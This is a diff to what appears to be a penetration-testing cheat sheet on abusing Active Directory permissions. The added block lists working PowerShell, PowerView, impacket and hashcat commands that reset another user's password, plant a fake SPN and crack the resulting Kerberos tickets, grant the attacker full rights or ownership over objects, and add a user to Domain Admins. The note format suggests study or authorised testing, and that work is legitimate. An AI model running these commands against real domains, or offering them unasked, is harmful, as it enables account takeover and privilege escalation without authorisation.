@@ -247,8 +247,7 @@ net group "Management Department" stephanie /del /domain
 Abuse Examples
 ```powershell
 # Reset user password (GenericAll / ForceChangePassword / AllExtendedRights)
-Set-ADAccountPassword -Identity dave -Reset `
--NewPassword (ConvertTo-SecureString "NewPass123!" -AsPlainText -Force)
+Set-ADAccountPassword -Identity dave -Reset -NewPassword (ConvertTo-SecureString "NewPass123!" -AsPlainText -Force)
 # Add user to a group (if you control the group)
 net group "Management Department" stephanie /add /domain
 # Confirm membership
@@ -257,12 +256,31 @@ Get-NetGroup "Management Department" | select member
 net group "Management Department" stephanie /del /domain
 ```
 Typical Abuse Scenarios
-```powershell
-If you have GenericAll over a user → Full account takeover.
-If you have GenericWrite over a user → Add fake SPN → Kerberoast.
-If you have WriteDACL → Grant yourself GenericAll → Takeover.
-If you have WriteOwner → Become owner → Modify ACL → Escalate.
-If you have rights over a privileged group → Add yourself → Privilege escalation.
+```bash
+#If you have GenericAll over a user → Full account takeover.
+Set-ADAccountPassword -Identity dave -Reset -NewPassword (ConvertTo-SecureString "NewPass123!" -AsPlainText -Force)
+
+#If you have GenericWrite over a user → Add fake SPN → Kerberoast.
+Set-ADUser -Identity websvc `
+-ServicePrincipalNames @{Add='fake/http'}
+## From kali
+impacket-GetUserSPNs domain.local/user:password -dc-ip <IP>
+hashcat -m 13100 hashes.txt rockyou.txt
+
+#If you have WriteDACL → Grant yourself GenericAll → Takeover.
+Add-DomainObjectAcl -TargetIdentity dave -PrincipalIdentity stephanie -Rights All
+##Then reset password:
+Set-ADAccountPassword -Identity dave -Reset -NewPassword (ConvertTo-SecureString "NewPass123!" -AsPlainText -Force)
+
+#If you have WriteOwner → Become owner → Modify ACL → Escalate.
+Set-DomainObjectOwner -Identity "Management" -OwnerIdentity stephanie
+## Now grant yourself full rights:
+Add-DomainObjectAcl -TargetIdentity "Management" -PrincipalIdentity stephanie -Rights All
+net group "Management" stephanie /add /domain
+
+#If you have rights over a privileged group → Add yourself → Privilege escalation.
+net group "Domain Admins" stephanie /add /domain
+Get-NetGroup "Domain Admins" | select member
 ```
 
 ##### Enumerate Doimain Shares
